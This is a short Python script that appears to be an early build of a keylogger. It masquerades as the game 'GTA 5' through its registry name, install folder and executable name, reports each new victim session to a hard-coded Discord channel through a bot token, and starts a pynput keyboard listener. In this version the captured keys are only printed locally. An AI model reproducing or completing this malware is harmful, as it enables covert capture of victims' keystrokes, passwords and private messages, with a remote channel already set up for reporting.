import discord
from pynput.keyboard import Key, Listener
import sys

client = discord.Client()
bot_token = ''   # Paste here BOT-token
software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name

channel_ids = {
    'main': 831567586344697868   # Paste here main channel ID
}

if sys.argv[0].lower() != 'c:\\program files\\' + software_directory_name.lower() + '\\' + software_executable_name.lower():
    print('First launch!')

@client.event 
async def on_ready():  
    await client.get_channel(channel_ids['main']).send('New PC session')

def on_press(key):
    print(key)

with Listener(on_press=on_press) as listener:
    client.run(bot_token)
    listener.join()
